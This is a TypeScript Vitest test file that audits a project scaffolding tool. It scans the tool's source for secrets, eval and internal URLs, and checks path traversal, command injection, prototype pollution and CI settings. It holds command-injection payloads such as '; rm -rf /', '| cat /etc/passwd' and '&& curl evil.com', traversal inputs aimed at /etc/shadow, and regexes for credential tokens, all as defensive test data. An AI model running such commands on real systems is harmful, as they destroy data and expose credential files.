import { describe, it, expect, beforeEach, afterAll } from 'vitest';
import fs from 'fs-extra';
import path from 'node:path';
import { scaffoldProject } from '../../src/scaffold.js';
import { validateProjectName, validateDirectory } from '../../src/validation.js';
import type { ProjectOptions } from '../../src/types.js';

// ─── Helpers ────────────────────────────────────────────────────────────────

const TEST_DIR = '/tmp/helix-test-security-audit';
const SRC_DIR = path.resolve(__dirname, '..', '..', 'src');

function makeOptions(overrides: Partial<ProjectOptions> = {}): ProjectOptions {
  return {
    name: 'test-app',
    directory: path.join(TEST_DIR, overrides.name ?? 'test-app'),
    framework: 'react-vite',
    componentBundles: ['core'],
    typescript: true,
    eslint: false,
    designTokens: false,
    darkMode: false,
    installDeps: false,
    ...overrides,
  };
}

beforeEach(async () => {
  await fs.remove(TEST_DIR);
  await fs.ensureDir(TEST_DIR);
});

afterAll(async () => {
  await fs.remove(TEST_DIR);
});

// ─── Collect all source files ───────────────────────────────────────────────

async function getAllSourceFiles(): Promise<string[]> {
  const results: string[] = [];

  async function walk(dir: string): Promise<void> {
    const entries = await fs.readdir(dir, { withFileTypes: true });
    for (const entry of entries) {
      const full = path.join(dir, entry.name);
      if (entry.isDirectory()) {
        if (entry.name === '__tests__' || entry.name === 'node_modules') continue;
        await walk(full);
      } else if (entry.name.endsWith('.ts') && !entry.name.endsWith('.test.ts')) {
        results.push(full);
      }
    }
  }

  await walk(SRC_DIR);
  return results;
}

// ─── 1. No hardcoded secrets in source code ─────────────────────────────────

describe('no hardcoded secrets in source files', () => {
  const SECRET_PATTERNS = [
    // API keys and tokens
    { name: 'AWS access key', pattern: /AKIA[0-9A-Z]{16}/ },
    {
      name: 'Generic API key assignment',
      pattern: /(?:api[_-]?key|apikey)\s*[:=]\s*['"][a-zA-Z0-9]{20,}['"]/,
    },
    {
      name: 'Generic secret assignment',
      pattern: /(?:secret|password|passwd|token)\s*[:=]\s*['"][a-zA-Z0-9!@#$%^&*]{8,}['"]/,
    },
    { name: 'Private key block', pattern: /-----BEGIN (?:RSA |EC |DSA )?PRIVATE KEY-----/ },
    { name: 'GitHub personal access token', pattern: /ghp_[a-zA-Z0-9]{36}/ },
    { name: 'GitHub OAuth token', pattern: /gho_[a-zA-Z0-9]{36}/ },
    { name: 'npm token', pattern: /npm_[a-zA-Z0-9]{36}/ },
    {
      name: 'Slack webhook',
      pattern: /hooks\.slack\.com\/services\/T[a-zA-Z0-9_]+\/B[a-zA-Z0-9_]+\/[a-zA-Z0-9_]+/,
    },
    {
      name: 'Discord webhook token',
      pattern: /discord(?:app)?\.com\/api\/webhooks\/\d+\/[a-zA-Z0-9_-]+/,
    },
    { name: 'Bearer token literal', pattern: /['"]Bearer\s+[a-zA-Z0-9._~+/=-]{20,}['"]/ },
    { name: 'Base64-encoded password', pattern: /password\s*[:=]\s*['"][A-Za-z0-9+/=]{20,}['"]/ },
  ];

  it('scans all source files for secret patterns', async () => {
    const sourceFiles = await getAllSourceFiles();
    expect(sourceFiles.length).toBeGreaterThan(0);

    const violations: string[] = [];

    for (const filePath of sourceFiles) {
      const content = await fs.readFile(filePath, 'utf-8');
      const relativePath = path.relative(SRC_DIR, filePath);

      for (const { name, pattern } of SECRET_PATTERNS) {
        if (pattern.test(content)) {
          violations.push(`${relativePath}: found ${name}`);
        }
      }
    }

    expect(violations).toEqual([]);
  });
});

// ─── 2. No eval() or Function() usage ──────────────────────────────────────

describe('no dangerous code execution patterns', () => {
  it('source files do not use eval()', async () => {
    const sourceFiles = await getAllSourceFiles();
    const violations: string[] = [];

    for (const filePath of sourceFiles) {
      const content = await fs.readFile(filePath, 'utf-8');
      const relativePath = path.relative(SRC_DIR, filePath);
      const lines = content.split('\n');

      for (let i = 0; i < lines.length; i++) {
        const line = lines[i];
        // Match eval( but not .evaluate( or "eval" in strings describing validation
        if (/\beval\s*\(/.test(line) && !/\/\//.test(line.split('eval')[0])) {
          violations.push(`${relativePath}:${String(i + 1)}: uses eval()`);
        }
      }
    }

    expect(violations).toEqual([]);
  });

  it('source files do not use new Function()', async () => {
    const sourceFiles = await getAllSourceFiles();
    const violations: string[] = [];

    for (const filePath of sourceFiles) {
      const content = await fs.readFile(filePath, 'utf-8');
      const relativePath = path.relative(SRC_DIR, filePath);
      const lines = content.split('\n');

      for (let i = 0; i < lines.length; i++) {
        const line = lines[i];
        if (/\bnew\s+Function\s*\(/.test(line)) {
          violations.push(`${relativePath}:${String(i + 1)}: uses new Function()`);
        }
      }
    }

    expect(violations).toEqual([]);
  });
});

// ─── 3. No hardcoded URLs to internal/private services ──────────────────────

describe('no hardcoded internal/private service URLs', () => {
  const INTERNAL_URL_PATTERNS = [
    { name: 'localhost URL', pattern: /https?:\/\/localhost(?::\d+)?\/\S+/ },
    { name: 'internal IP (10.x)', pattern: /https?:\/\/10\.\d+\.\d+\.\d+/ },
    { name: 'internal IP (192.168.x)', pattern: /https?:\/\/192\.168\.\d+\.\d+/ },
    {
      name: 'internal IP (172.16-31.x)',
      pattern: /https?:\/\/172\.(?:1[6-9]|2\d|3[01])\.\d+\.\d+/,
    },
    { name: 'internal hostname', pattern: /https?:\/\/[a-z0-9-]+\.internal(?::\d+)?/ },
    { name: 'corp hostname', pattern: /https?:\/\/[a-z0-9-]+\.corp(?:\.[a-z]+)?(?::\d+)?/ },
  ];

  it('source files contain no internal/private URLs', async () => {
    const sourceFiles = await getAllSourceFiles();
    const violations: string[] = [];

    for (const filePath of sourceFiles) {
      const content = await fs.readFile(filePath, 'utf-8');
      const relativePath = path.relative(SRC_DIR, filePath);

      for (const { name, pattern } of INTERNAL_URL_PATTERNS) {
        if (pattern.test(content)) {
          violations.push(`${relativePath}: contains ${name}`);
        }
      }
    }

    expect(violations).toEqual([]);
  });
});

// ─── 4. Path traversal rejection ────────────────────────────────────────────

describe('scaffoldProject rejects path traversal', () => {
  it('rejects directory containing .. segment', async () => {
    // Use a path where ".." survives as a segment after path.normalize,
    // e.g. a relative path starting with ".."
    const opts = makeOptions({
      directory: '../../../tmp/escape-attempt',
    });

    await expect(scaffoldProject(opts)).rejects.toThrow(/traversal/i);
  });

  it('rejects bare .. as directory', async () => {
    const opts = makeOptions({
      directory: '..',
    });

    await expect(scaffoldProject(opts)).rejects.toThrow(/traversal/i);
  });

  it('validateDirectory rejects embedded ../ traversal', () => {
    expect(validateDirectory('/tmp/foo/../../../etc/passwd')).toBeTruthy();
  });

  it('validateDirectory rejects ..\\ traversal (Windows-style)', () => {
    expect(validateDirectory('foo\\..\\bar')).toBeTruthy();
  });
});

// ─── 5. Input validation blocks command injection attempts ──────────────────

describe('input validation blocks command injection', () => {
  const INJECTION_PAYLOADS = [
    '; rm -rf /',
    '$(whoami)',
    '`id`',
    '| cat /etc/passwd',
    '&& curl evil.com',
    '\n rm -rf /',
    'foo; echo pwned',
    'foo$(touch /tmp/pwned)',
    'foo`touch /tmp/pwned`',
  ];

  it('validateProjectName rejects all command injection payloads', () => {
    for (const payload of INJECTION_PAYLOADS) {
      const result = validateProjectName(payload);
      expect(result).toBeTruthy();
    }
  });

  it('validateDirectory rejects null byte injection', () => {
    const result = validateDirectory('/tmp/safe\0/etc/shadow');
    expect(result).toBeTruthy();
  });

  it('validateDirectory rejects non-printable characters', () => {
    const result = validateDirectory('/tmp/\x01hidden');
    expect(result).toBeTruthy();
  });
});

// ─── 6. .env files are in .gitignore patterns ──────────────────────────────

describe('.gitignore includes .env exclusions', () => {
  it('project .gitignore excludes .env files', async () => {
    const gitignorePath = path.resolve(__dirname, '..', '..', '.gitignore');
    const content = await fs.readFile(gitignorePath, 'utf-8');

    expect(content).toContain('.env');
  });

  it('scaffolded project .gitignore excludes .env files', async () => {
    const opts = makeOptions({ name: 'gitignore-check' });
    await scaffoldProject(opts);

    const gitignorePath = path.join(opts.directory, '.gitignore');
    const content = await fs.readFile(gitignorePath, 'utf-8');

    expect(content).toContain('.env');
  });
});

// ─── 7. No prototype pollution via reserved names ───────────────────────────

describe('prototype pollution prevention', () => {
  it('validateProjectName rejects __proto__', () => {
    expect(validateProjectName('__proto__')).toBeTruthy();
  });

  it('validateProjectName rejects constructor', () => {
    expect(validateProjectName('constructor')).toBeTruthy();
  });

  it('validateProjectName rejects prototype', () => {
    expect(validateProjectName('prototype')).toBeTruthy();
  });
});

// ─── 8. execSync uses only hardcoded commands ───────────────────────────────

describe('execSync usage is safe (no user input interpolation)', () => {
  it('cli.ts execSync calls use hardcoded commands', async () => {
    const cliPath = path.join(SRC_DIR, 'cli.ts');
    const content = await fs.readFile(cliPath, 'utf-8');

    // Find all execSync call sites
    const execSyncCalls = content.match(/execSync\([^)]+\)/g) ?? [];
    expect(execSyncCalls.length).toBeGreaterThan(0);

    for (const call of execSyncCalls) {
      // Each call should use a string literal, not a template literal with variables
      // or string concatenation with user input
      expect(call).toMatch(/execSync\(\s*'[^']*'/);
    }
  });

  it('doctor.ts runCommand call sites use hardcoded commands', async () => {
    const doctorPath = path.join(SRC_DIR, 'doctor.ts');
    const content = await fs.readFile(doctorPath, 'utf-8');

    // Extract only runCommand invocation lines (not the function definition)
    const lines = content.split('\n');
    const callSiteLines = lines.filter(
      (line) => /runCommand\(/.test(line) && !line.includes('function runCommand'),
    );
    expect(callSiteLines.length).toBeGreaterThan(0);

    for (const line of callSiteLines) {
      // Each call site should pass a string literal or a safe template literal
      expect(line).toMatch(/runCommand\(\s*(?:'[^']*'|`[^`]*`)/);
    }
  });
});

// ─── 9. CI workflow security ────────────────────────────────────────────────

describe('CI workflow security', () => {
  it('CI workflow uses least-privilege permissions', async () => {
    const ciPath = path.resolve(__dirname, '..', '..', '.github', 'workflows', 'ci.yml');
    const content = await fs.readFile(ciPath, 'utf-8');

    // CI should use read-only permissions at the top level
    expect(content).toContain('contents: read');
  });

  it('CI workflow does not expose secrets in logs', async () => {
    const ciPath = path.resolve(__dirname, '..', '..', '.github', 'workflows', 'ci.yml');
    const content = await fs.readFile(ciPath, 'utf-8');

    // Should not echo secret values
    expect(content).not.toMatch(/echo\s+.*\$\{\{\s*secrets\./);
  });

  it('release workflow uses secrets only in env, not inline', async () => {
    const releasePath = path.resolve(__dirname, '..', '..', '.github', 'workflows', 'release.yml');
    const content = await fs.readFile(releasePath, 'utf-8');

    // Secrets should be passed via env: blocks, not directly in run: commands
    expect(content).not.toMatch(/run:.*\$\{\{\s*secrets\./);
  });

  it('CI includes a secret scanning job', async () => {
    const ciPath = path.resolve(__dirname, '..', '..', '.github', 'workflows', 'ci.yml');
    const content = await fs.readFile(ciPath, 'utf-8');

    expect(content).toContain('secret-scan');
    expect(content).toContain('gitleaks');
  });
});

// ─── 10. No @ts-ignore or any usage ────────────────────────────────────────

describe('TypeScript strict mode compliance', () => {
  it('source files do not use @ts-ignore', async () => {
    const sourceFiles = await getAllSourceFiles();
    const violations: string[] = [];

    for (const filePath of sourceFiles) {
      const content = await fs.readFile(filePath, 'utf-8');
      const relativePath = path.relative(SRC_DIR, filePath);

      if (content.includes('@ts-ignore')) {
        violations.push(`${relativePath}: uses @ts-ignore`);
      }
    }

    expect(violations).toEqual([]);
  });

  it('source files do not use explicit any type annotation', async () => {
    const sourceFiles = await getAllSourceFiles();
    const violations: string[] = [];

    for (const filePath of sourceFiles) {
      const content = await fs.readFile(filePath, 'utf-8');
      const relativePath = path.relative(SRC_DIR, filePath);
      const lines = content.split('\n');

      for (let i = 0; i < lines.length; i++) {
        const line = lines[i];
        // Match `: any` or `as any` but not inside comments or strings
        if (/:\s*any\b/.test(line) || /\bas\s+any\b/.test(line)) {
          // Skip if the line is a comment
          const trimmed = line.trim();
          if (trimmed.startsWith('//') || trimmed.startsWith('*')) continue;
          violations.push(`${relativePath}:${String(i + 1)}: uses 'any' type`);
        }
      }
    }

    expect(violations).toEqual([]);
  });
});
